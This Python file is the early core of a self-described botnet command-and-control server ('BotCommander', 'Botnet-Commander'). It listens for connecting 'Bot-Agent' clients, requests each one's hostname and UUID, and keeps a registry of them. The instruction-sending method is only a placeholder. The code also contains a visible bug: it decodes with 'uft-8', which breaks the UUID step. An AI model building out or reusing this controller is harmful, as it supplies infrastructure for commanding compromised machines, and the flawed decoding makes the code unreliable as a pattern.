import os
import asyncio
import json
from pathlib import Path
import time
import configparser
from logger import CoreLogger
from socket import socket, AF_INET, SOCK_STREAM


def load_conf():
    config_parser = configparser.ConfigParser()
    cwd_path = Path(__file__)
    root_dir = cwd_path.parent.absolute()
    try:
        config_path = os.path.join(root_dir, "cfg/commander.ini")
        config_parser.read(config_path)
        host = config_parser.get("CORE", "HOST")
        port = int(config_parser.get("CORE", "PORT"))
        log_level = int(config_parser.get("CORE", "LOG_LEVEL"))
        log_dir = config_parser.get("CORE", "LOG_DIR")
        log_name = config_parser.get("CORE", "LOG_NAME")
        conn_buff = int(config_parser.get("CORE", "CONN_BUFF"))
    except Exception as err:
        print("Error initializing CORE, Commander not started because config file could not be loaded. Unexpected "
              "exception occurred: {}".format(err))
        exit(5)
    return host, port, log_level, log_dir, log_name, conn_buff


class BotCommander:
    def __init__(self, host, port, conn_rcv):
        self.uuids = {}
        self.host = host
        self.port = port
        self.conn_rcv = conn_rcv
        self.sock = socket(AF_INET, SOCK_STREAM)
        asyncio.run(self.__run())

    async def __send_instructions(self, reader, writer):
        message = "Hello"
        addr = writer.get_extra_info('peername')
        logger.core.debug(f"Sending data {message} to peer {addr}")
        writer.write(message.encode("utf-8"))

        data = await reader.read(self.conn_rcv)
        message = data.decode("utf-8")
        logger.core.debug(f"Received {message} from {addr}")

        writer.close()

    async def __identify_agent(self, reader, writer):
        addr = writer.get_extra_info('peername')
        logger.core.info(f"Connection accepted from peer {addr}")
        hostname = await self.__get_hostname(reader, writer, addr)
        if not hostname:
            writer.close()
            return
        payload = self.__get_uuid_payload()
        logger.core.debug(f"Sending getUUID to peer {hostname}-{addr}")
        try:
            writer.write(payload)
            await writer.drain()
        except Exception as err:
            logger.core.error(f"Unexpected exception when sending getUUID to peer {hostname}-{addr}: {err},"
                              f" closing connection")
            writer.close()
            return
        try:
            data = await reader.read(self.conn_rcv)
        except Exception as err:
            logger.core.error(f"Unexpected exception when reading reply for getUUID from peer {addr}: {err},"
                              f" closing connection")
            writer.close()
            return
        if data:
            uuid = data.decode("uft-8")
            logger.core.debug(f"Received UUID {uuid} from peer")
            if uuid in self.uuids:
                logger.core.debug(f"Agent {self.uuids[uuid]} with UUID {uuid} already present in DB")
            else:
                online = True
                self.uuids[uuid] = (hostname, online)
                logger.core.debug(f"Successfully added agent {hostname}-{uuid} to DB")
        else:
            logger.core.error(f"Bot-Agent {addr} has not replied with UUID, unable to add agent, closing connection")
            writer.close()
            return

    @staticmethod
    def __get_uuid_payload():
        return "getUUID".encode("utf-8")

    async def __get_hostname(self, reader, writer, addr):
        logger.core.debug(f"Sending getAgentInfo to peer {addr}")
        try:
            writer.write(b"getAgentInfo")
            await writer.drain()
        except Exception as err:
            logger.core.error(f"Unexpected exception when sending getAgentInfo to peer {addr}: {err}, closing connection")
            return
        try:
            data = await reader.read(self.conn_rcv)
        except Exception as err:
            logger.core.error(f"Unexpected exception when reading reply for getAgentInfo from peer {addr}: {err},"
                              f" closing connection")
            return
        if data:
            hostname = data.decode("utf-8")
            logger.core.debug(f"Received AgentInfo {hostname} from agent {addr}")
            return data.decode("utf-8")
        else:
            logger.core.error(f"Bot-Agent {addr} has not replied to AgentInfo, unable to add agent, closing connection")
            return

    async def __run(self):
        server = await asyncio.start_server(self.__identify_agent, self.host, self.port)

        addrs = ", ".join(str(self.sock.getsockname()) for self.sock in server.sockets)
        logger.core.info(f"Server started listener on {addrs}")

        async with server:
            await server.serve_forever()


if __name__ == "__main__":
    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, CONN_BUFF = load_conf()
    logger = CoreLogger(LOG_LEVEL, LOG_DIR, LOG_NAME)
    srv = BotCommander(HOST, PORT, CONN_BUFF)
    logger.core.info("Botnet-Commander exited")
